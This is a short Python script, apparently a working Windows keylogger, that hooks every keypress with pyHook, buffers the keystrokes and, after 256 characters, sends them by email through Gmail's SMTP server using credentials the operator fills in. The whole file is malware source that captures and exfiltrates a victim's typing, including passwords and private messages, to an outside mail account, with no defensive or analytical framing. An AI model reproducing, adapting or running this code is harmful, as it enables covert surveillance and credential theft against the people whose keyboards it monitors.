#!/usr/bin/env python
import pythoncom, pyHook
import smtplib

keylog = '' #Everything gets logged in this variable!

def OnKeyboardEvent(event):
    #Keyboard press event capture
    global keylog
    keylog+=event.Key
    if len(keylog)>256:  #Check size of the keystrokes captured
        server = smtplib.SMTP('smtp.gmail.com:587') #Mailing part begins
        #From and to address to send the mail
        fromaddr = 'jane@doe.com'
        toaddr = 'john@doe.com'
        server.starttls()
        #Alter this line and include your login credentials
        server.login('your@email.com','your_password')
        server.sendmail(fromaddr, toaddr, keylog) #Send the keystrokes
        server.close() #Mailing part ends
        keylog=''  #Reset keylog to capture new keystrokes
    return True

if __name__=='__main__':
    #Entry Point
    hook_manager = pyHook.HookManager() #Create a new hook manager
    hook_manager.KeyDown = OnKeyboardEvent #Assign the keydown event to our custom method
    hook_manager.HookKeyboard() #Hook the keyboard events
    pythoncom.PumpMessages() #Run forever !

